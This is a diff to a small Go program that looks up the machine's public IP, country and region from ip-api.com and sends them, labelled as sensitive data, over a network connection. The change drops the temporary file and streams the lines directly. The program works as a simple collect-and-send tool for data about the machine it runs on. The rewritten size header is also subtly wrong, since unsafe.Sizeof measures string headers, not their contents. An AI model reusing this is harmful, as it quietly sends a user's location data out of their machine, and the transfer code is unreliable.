@@ -8,6 +8,7 @@ import (
 	"net/http"
 	"os"
 	"strconv"
+	"unsafe"
 )
 
 const (
@@ -24,7 +25,10 @@ type IPApiData struct {
 	Query       string
 }
 
-var logger = log.New(os.Stdout, "INFO: ", log.Ldate|log.Ltime)
+var (
+	logger = log.New(os.Stdout, "INFO: ", log.Ldate|log.Ltime)
+	lines  = []string{}
+)
 
 func GetExtData() IPApiData {
 	request, err := http.Get("http://ip-api.com/json/")
@@ -38,23 +42,6 @@ func GetExtData() IPApiData {
 	json.Unmarshal(body, &extData)
 
 	return extData
-}
-
-// Bad way of doing this shit
-func FormatAndWriteData(data IPApiData) {
-	var (
-		lines     = []string{"Country: " + data.CountryCode, "Region: " + data.Region, "IP: " + data.Query}
-		file, err = os.Create(PATH)
-	)
-	handleError(err)
-	defer file.Close()
-
-	// dont need to do this, could just send the array of lines as bytes
-	for i := 0; i < len(lines); i++ {
-		_, err := file.WriteString(lines[i] + "\n")
-		handleError(err)
-		file.Sync()
-	}
 }
 
 // Fill string with : to fit into buffer
@@ -78,30 +65,21 @@ func main() {
 	defer conn.Close()
 
 	sensitiveData := GetExtData()
-	FormatAndWriteData(sensitiveData)
+	lines = append(lines,
+		"IP: "+sensitiveData.Query,
+		"Country: "+sensitiveData.CountryCode,
+		"Region: "+sensitiveData.Region)
 
 	// Transfer file with collected data
-	SendFile(conn, PATH)
+	SendData(conn)
 }
 
-func SendFile(conn net.Conn, path string) {
-	// Load file and resources
-	dataFile, err := os.Open(path)
-	handleError(err)
-	fileInfo, err := dataFile.Stat()
-	handleError(err)
-	fileSize := fillString(strconv.FormatInt(fileInfo.Size(), 10), 10)
+func SendData(conn net.Conn) {
+	arraySize := fillString(strconv.FormatInt(int64(unsafe.Sizeof(lines[0])*uintptr(len(lines))), 10), 10)
+	conn.Write([]byte(arraySize))
 
-	// Send file size
-	sendBuffer := make([]byte, BUFFERSIZE)
-	conn.Write([]byte(fileSize))
-
-	// Send actual file
-	for {
-		_, err = dataFile.Read(sendBuffer)
-		if err == io.EOF {
-			break
-		}
+	for i := 0; i < len(lines); i++ {
+		sendBuffer := []byte(lines[i] + "\n")
 		conn.Write(sendBuffer)
 	}
 }
